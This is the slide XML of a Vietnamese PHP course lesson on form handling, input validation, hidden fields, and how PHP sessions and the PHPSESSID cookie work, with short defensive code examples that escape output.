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21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6"/>
    <p:sldId id="271" r:id="rId5"/>
    <p:sldId id="272" r:id="rId4"/>
    <p:sldId id="273" r:id="rId3"/>
    <p:sldId id="274" r:id="rId2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4000" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr>
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="64" d="100"/>
          <a:sy n="64" d="100"/>
        </p:scale>
        <p:origin x="1340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9.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide18.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide17.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide16.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide15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D529C2-2740-49AF-AD85-11B5D3921039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3765A4-D309-444E-9276-0B2CD25A6C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988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4BE3-F7ED-4F3E-8A95-B55AC90E785B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D2862-91D1-4AD8-B8BA-DEE8FF1572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4BE3-F7ED-4F3E-8A95-B55AC90E785B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D2862-91D1-4AD8-B8BA-DEE8FF1572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4BE3-F7ED-4F3E-8A95-B55AC90E785B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D2862-91D1-4AD8-B8BA-DEE8FF1572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4BE3-F7ED-4F3E-8A95-B55AC90E785B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D2862-91D1-4AD8-B8BA-DEE8FF1572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4BE3-F7ED-4F3E-8A95-B55AC90E785B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D2862-91D1-4AD8-B8BA-DEE8FF1572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4BE3-F7ED-4F3E-8A95-B55AC90E785B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D2862-91D1-4AD8-B8BA-DEE8FF1572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4BE3-F7ED-4F3E-8A95-B55AC90E785B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D2862-91D1-4AD8-B8BA-DEE8FF1572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4BE3-F7ED-4F3E-8A95-B55AC90E785B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D2862-91D1-4AD8-B8BA-DEE8FF15728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4BE3-F7ED-4F3E-8A95-B55AC90E785B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5D2862-91D1-4AD8-B8BA-DEE8FF15728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4BE3-F7ED-4F3E-8A95-B55AC90E785B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D2862-91D1-4AD8-B8BA-DEE8FF1572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4BE3-F7ED-4F3E-8A95-B55AC90E785B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D2862-91D1-4AD8-B8BA-DEE8FF1572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1F5D2862-91D1-4AD8-B8BA-DEE8FF15728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8E254BE3-F7ED-4F3E-8A95-B55AC90E785B}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>9/30/2025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r>
              <a:rPr sz="3400"/>
              <a:t>Khóa đào tạo
Lập trình Web: PHP · Vue · MySQL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/>
              <a:t>Buổi 5 — Xử lý form, Session/Cookie &amp; luồng đăng nhập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Nội dung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600" b="0"/>
              <a:t>1. Mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>2. Chuẩn bị</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>Tiết 1 — Form &amp; truyền dữ liệu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>Tiết 2 — Cookie, đăng nhập &amp; bảo mật</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>3. Thực hành tại lớp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>4. Bài tập về nhà</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>5. Checklist cuối buổi</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>6. Tham khảo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1. Mục tiêu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1600" b="0"/>
              <a:t>Kết thúc buổi học, học viên có thể:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>Truyền dữ liệu giữa các trang bằng </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>hidden</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>Kiểm tra (validate) dữ liệu form phía server và hiển thị lỗi cho người dùng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>Phân biệt và sử dụng đúng </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="1"/>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> và </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="1"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>Xây dựng luồng </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="1"/>
              <a:t>đăng nhập / đăng xuất / phân quyền</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> hoàn chỉnh.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>Băm mật khẩu bằng </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>password_hash()</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> và hiểu vì sao không được lưu mật khẩu dạng thô.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>Nhận diện và phòng chống </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="1"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> và </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="1"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b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2. Chuẩn bị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2000" b="0"/>
              <a:t>Dự án </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>course8</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> với CRUD sản phẩm từ buổi 4.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>Bảng </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>user</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> trong CSDL đã có dữ liệu mẫu.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Tiết 1 — Form &amp; truyền dữ liệu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/>
              <a:t>1.1. Các cách truyền dữ liệu trong ứng dụng web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Cách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Phạm vi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Dùng khi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GET</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1300" b="0"/>
                        <a:t> (query string)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Trong 1 request, hiện trên URL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Tìm kiếm, phân trang, link chi tiết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POST</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1300" b="0"/>
                        <a:t> (form body)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Trong 1 request, không hiện URL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Gửi form thêm/sửa, đăng nhập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hidden input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Sang trang tiếp theo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Mang theo id, token khi submit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Cookie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Lưu ở </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1300" b="1"/>
                        <a:t>máy người dùng</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1300" b="0"/>
                        <a:t>, nhiều phiên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Ghi nhớ đăng nhập, tùy chọn giao diện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Session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Lưu ở </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1300" b="1"/>
                        <a:t>server</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1300" b="0"/>
                        <a:t>, hết khi đóng trình duyệt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Trạng thái đăng nhập, giỏ hàng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/>
                        <a:t>API (JSON)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Giữa các hệ thống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Buổi 8 — Vue gọi PHP</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54864" marR="54864" marT="27432" marB="27432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1.2. GET và POST (1/5)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412480" cy="1227328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&lt;form method="get" action="buoi5_xuly_get.php"&gt;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Từ khóa: &lt;input type="text" name="keyword"&gt;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&lt;button type="submit"&gt;Tìm&lt;/button&gt;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&lt;/form&gt;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1.2. GET và POST (2/5)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412480" cy="1703832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&lt;?php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// File: buoi5_xuly_get.php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// URL se co dang: buoi5_xuly_get.php?keyword=but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$keyword = $_GET["keyword"] ?? "";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echo "Bạn tìm: " . htmlspecialchars($keyword);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?&gt;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1.2. GET và POST (3/5)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412480" cy="1465580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&lt;form method="post" action="buoi5_xuly_post.php"&gt;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Username: &lt;input type="text" name="username"&gt;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Password: &lt;input type="password" name="password"&gt;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&lt;button type="submit"&gt;Đăng nhập&lt;/button&gt;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&lt;/form&gt;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1.2. GET và POST (4/5)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GET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POST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/>
                        <a:t>Hiển thị dữ liệu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Trên URL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Ẩn trong body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/>
                        <a:t>Giới hạn độ dài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~2000 ký tự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Rất lớn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/>
                        <a:t>Lưu được bookmark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Có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Không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/>
                        <a:t>Dùng cho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Đọc dữ liệu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Thay đổi dữ liệu</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54864" marR="54864" marT="27432" marB="27432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1.2. GET và POST (5/5)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800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1900" i="1" b="1">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Nguyên tắc:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t> thao tác </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="1">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>đọc</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t> dùng GET, thao tác </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="1">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ghi/xóa</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t> dùng POST. Không bao giờ gửi mật khẩu qua GET.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/>
              <a:t>1.3. Self-handling: một file vừa hiển thị vừa xử lý (1/4)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755648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/>
              <a:t>Đây là kiểu viết dùng xuyên suốt trong khóa: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231136"/>
            <a:ext cx="8412480" cy="4306824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&lt;?php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// File: buoi5_dangky.php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$loi     = [];    // mang chua thong bao loi cua tung truong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$hoTen   = "";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$email   = "";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if ($_SERVER["REQUEST_METHOD"] === "POST")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$hoTen = trim($_POST["hoten"] ?? "");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$email = trim($_POST["email"] ?? "");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$tuoi  = (int)($_POST["tuoi"] ?? 0);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    // --- Kiem tra du lieu ---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if ($hoTen === "")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$loi["hoten"] = "Yêu cầu nhập họ tên";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} elseif (mb_strlen($hoTen) &gt; 100)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$loi["hoten"] = "Họ tên tối đa 100 ký tự";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if ($email === "")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$loi["email"] = "Yêu cầu nhập email";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} elseif (!filter_var($email, FILTER_VALIDATE_EMAIL))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$loi["email"] = "Email không đúng định dạng";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/>
              <a:t>1.3. Self-handling: một file vừa hiển thị vừa xử lý (2/4)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755648"/>
            <a:ext cx="8412480" cy="4358640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if ($tuoi &lt; 16 || $tuoi &gt; 100)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$loi["tuoi"] = "Tuổi phải từ 16 đến 100";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    // Khong co loi -&gt; xu ly tiep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if (count($loi) === 0)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echo "&lt;p style='color:green'&gt;Đăng ký thành công!&lt;/p&gt;";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?&gt;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&lt;form method="post"&gt;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&lt;p&gt;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Họ tên: &lt;input type="text" name="hoten" value="&lt;?= htmlspecialchars($hoTen) ?&gt;"&gt;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&lt;span style="color:red"&gt;&lt;?= $loi["hoten"] ?? "" ?&gt;&lt;/span&gt;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&lt;/p&gt;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&lt;p&gt;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Email: &lt;input type="text" name="email" value="&lt;?= htmlspecialchars($email) ?&gt;"&gt;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&lt;span style="color:red"&gt;&lt;?= $loi["email"] ?? "" ?&gt;&lt;/span&gt;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&lt;/p&gt;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&lt;p&gt;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Tuổi: &lt;input type="number" name="tuoi"&gt;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&lt;span style="color:red"&gt;&lt;?= $loi["tuoi"] ?? "" ?&gt;&lt;/span&gt;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&lt;/p&gt;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/>
              <a:t>1.3. Self-handling: một file vừa hiển thị vừa xử lý (3/4)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755648"/>
            <a:ext cx="8412480" cy="750824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&lt;button type="submit"&gt;Đăng ký&lt;/button&gt;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&lt;/form&gt;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/>
              <a:t>1.3. Self-handling: một file vừa hiển thị vừa xử lý (4/4)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2000" b="1"/>
              <a:t>Ba quy tắc validate bắt buộc:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>Luôn kiểm tra ở </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>server</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>, kể cả khi đã có </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>required</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> ở HTML (người dùng có thể bỏ qua HTML).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>Giữ lại giá trị người dùng đã nhập khi báo lỗi (</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>value="&lt;?= ... ?&gt;"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>Báo lỗi ngay cạnh ô nhập, chữ đỏ, nội dung cụ thể.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/>
              <a:t>1.4. Truyền dữ liệu sang trang thứ ba bằng hidden (1/4)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755648"/>
            <a:ext cx="8412480" cy="1227328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&lt;form method="post" action="pageB.php"&gt;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Họ tên: &lt;input type="text" name="hoten"&gt;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&lt;button type="submit"&gt;Tiếp tục&lt;/button&gt;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&lt;/form&gt;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/>
              <a:t>1.4. Truyền dữ liệu sang trang thứ ba bằng hidden (2/4)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755648"/>
            <a:ext cx="8412480" cy="1397508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&lt;?php // Trang B: nhan tu A, hoi them, mang theo du lieu cua A ?&gt;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&lt;form method="post" action="pageC.php"&gt;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&lt;input type="hidden" name="hoten" value="&lt;?= htmlspecialchars($_POST["hoten"]) ?&gt;"&gt;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Địa chỉ: &lt;input type="text" name="diachi"&gt;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&lt;button type="submit"&gt;Hoàn tất&lt;/button&gt;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&lt;/form&gt;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/>
              <a:t>1.4. Truyền dữ liệu sang trang thứ ba bằng hidden (3/4)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755648"/>
            <a:ext cx="8412480" cy="1465580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&lt;?php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// Trang C: nhan du lieu cua ca A va B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echo "Họ tên: " . htmlspecialchars($_POST["hoten"]);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echo "&lt;br&gt;Địa chỉ: " . htmlspecialchars($_POST["diachi"]);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?&gt;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/>
              <a:t>1.4. Truyền dữ liệu sang trang thứ ba bằng hidden (4/4)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800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1900" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hidden </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="1">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>không hiển thị</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t> trên giao diện nhưng người dùng vẫn xem được bằng View Source và sửa được. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1900" i="1" b="1">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Không dùng hidden để lưu quyền hạn, giá tiền, hay id người dùng đang đăng nhập.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1.5. Session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/>
              <a:t>Session lưu dữ liệu </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="1"/>
              <a:t>trên server</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t>, trình duyệt chỉ giữ một mã định danh (</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>PHPSESSID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t>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664208"/>
            <a:ext cx="8412480" cy="2180336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&lt;?php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session_start();   // BAT BUOC goi truoc moi output HTML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// Ghi vao session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$_SESSION["username"] = "ngoctb";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$_SESSION["fullname"] = "Trần Bích Ngọc";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$_SESSION["is_admin"] = 0;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?&gt;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1.5. Session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412480" cy="2929128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&lt;?php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// Trang khac: doc ra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session_start();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if (isset($_SESSION["username"]))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echo "Xin chào " . htmlspecialchars($_SESSION["fullname"]);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} else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echo "Bạn chưa đăng nhập";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unset($_SESSION["username"]);   // xoa 1 khoa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session_destroy();              // huy toan bo session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?&gt;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1.5. Session (3/3)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2000" b="1"/>
              <a:t>Lỗi kinh điển:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Warning: session_start(): headers already sent</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> — do có khoảng trắng, dòng trống hoặc </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>echo</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>trước</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>session_start()</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>. Đặt </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;?php session_start();</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> ở dòng số 1, sát lề trái.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/>
              <a:t>1.6. Session ID và cookie phối hợp thế nào (1/11)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1800" b="0"/>
              <a:t>Session </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>không thay thế</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> cookie — session *dùng* cookie. Dữ liệu thật nằm ở server; trình duyệt chỉ cầm một cookie chứa </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>Session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> (mã ngẫu nhiên, đóng vai trò chiếc chìa khóa).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>Ai làm gì?</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> Không phải Apache, cũng không phải trình duyệt tự quyết — chính </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>module session của PHP</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> (chạy trong PHP engine) lo toàn bộ. Apache chỉ chuyển request cho PHP.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/>
              <a:t>1.6. Session ID và cookie phối hợp thế nào (2/11)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Bước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Ai làm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Việc gì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/>
                        <a:t>1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/>
                        <a:t>Lập trình viên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/>
                        <a:t>Gọi </a:t>
                      </a:r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session_start()</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> ở đầu file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/>
                        <a:t>2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/>
                        <a:t>PHP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/>
                        <a:t>Request chưa có cookie </a:t>
                      </a:r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PHPSESSID</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> → </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="1"/>
                        <a:t>sinh ID ngẫu nhiên</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t>, tạo file lưu dữ liệu trên server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/>
                        <a:t>3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/>
                        <a:t>PHP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/>
                        <a:t>Gắn vào phản hồi header </a:t>
                      </a:r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Set-Cookie: PHPSESSID=...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/>
                        <a:t>4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/>
                        <a:t>Trình duyệt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/>
                        <a:t>Nhận header, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="1"/>
                        <a:t>tự lưu</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> cookie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/>
                        <a:t>5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/>
                        <a:t>Trình duyệt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/>
                        <a:t>Mọi request sau </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="1"/>
                        <a:t>tự gửi lại</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> header </a:t>
                      </a:r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Cookie: PHPSESSID=...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/>
                        <a:t>6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/>
                        <a:t>PHP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session_start()</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> đọc ID từ cookie → mở đúng file → nạp vào </a:t>
                      </a:r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$_SESSION</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54864" marR="54864" marT="27432" marB="27432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/>
              <a:t>1.6. Session ID và cookie phối hợp thế nào (3/11)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412480" cy="2316480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LAN 1 (chua co cookie)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Browser ---- GET /login.php ------------------------&gt; Server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Browser &lt;--- Set-Cookie: PHPSESSID=k3j9x2... -------- Server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                           (tao file sess_k3j9x2...)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LAN 2 tro di (browser tu dong gui cookie)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Browser ---- GET /index.php ------------------------&gt; Server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   Cookie: PHPSESSID=k3j9x2...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Server: doc ID -&gt; mo file sess_k3j9x2... -&gt; $_SESSION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Browser &lt;--- HTML "Xin chao Ngoc" -------------------- Server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/>
              <a:t>1.6. Session ID và cookie phối hợp thế nào (4/11)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2000" b="1"/>
              <a:t>Dữ liệu session nằm ở đâu?</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> Mặc định là </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>một file cho mỗi session</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>, tên </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sess_&lt;ID&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>, trong thư mục </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>session.save_path</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> (XAMPP: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>C:/xampp/tmp/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>). Mở thử một file sẽ thấy nội dung đã serialize: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/>
              <a:t>1.6. Session ID và cookie phối hợp thế nào (5/11)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412480" cy="731520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username|s:6:"ngoctb";fullname|s:16:"Trần Bích Ngọc";is_admin|i:0;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/>
              <a:t>1.6. Session ID và cookie phối hợp thế nào (6/11)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2000" b="1"/>
              <a:t>Vì sao người này không lẫn với người kia?</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> Mỗi trình duyệt nhận một ID </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>khác nhau</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>, mỗi ID trỏ tới </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>một file riêng</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>. PHP không bao giờ tìm theo tên người dùng — chỉ tìm theo ID mà request mang theo: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/>
              <a:t>1.6. Session ID và cookie phối hợp thế nào (7/11)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412480" cy="835913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Ngoc  (Chrome)   Cookie: PHPSESSID=k3j9x2...  -&gt;  sess_k3j9x2...  user_id|i:2;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Minh  (Firefox)  Cookie: PHPSESSID=p8w4mz...  -&gt;  sess_p8w4mz...  user_id|i:5;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Khach (an danh)  (chua co cookie)             -&gt;  tao session moi, rong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/>
